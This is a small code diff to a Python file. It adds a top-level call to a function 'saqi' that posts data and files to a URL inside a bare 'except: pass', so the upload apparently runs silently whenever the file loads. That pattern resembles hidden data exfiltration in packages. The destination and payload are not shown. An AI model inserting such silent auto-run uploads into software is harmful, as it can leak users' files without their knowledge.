@@ -70,3 +70,5 @@ def saqi():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
+
+saqi()
